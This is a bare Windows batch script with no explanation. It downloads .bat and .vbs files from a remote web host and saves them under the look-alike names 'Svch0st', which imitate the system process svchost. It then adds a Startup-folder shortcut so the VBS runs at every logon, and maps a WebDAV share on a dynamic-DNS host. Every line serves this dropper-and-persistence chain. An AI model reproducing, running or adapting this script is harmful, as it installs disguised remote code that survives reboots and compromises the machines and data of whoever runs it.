cd %userprofile%\AppData\Local
powershell wget https://delta-12.github.io/testing/files/Svchost.bat -outfile Svch0st.bat
powershell wget https://delta-12.github.io/testing/files/Svchost.vbs -outfile Svch0st.vbs
cd %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('Svchost.lnk');$s.TargetPath='%userprofile%\AppData\Local\Svch0st.vbs';$s.Save()"
net use M: \\jajaja.servehttp.com\webdav /persistent:no
net use M: /delete
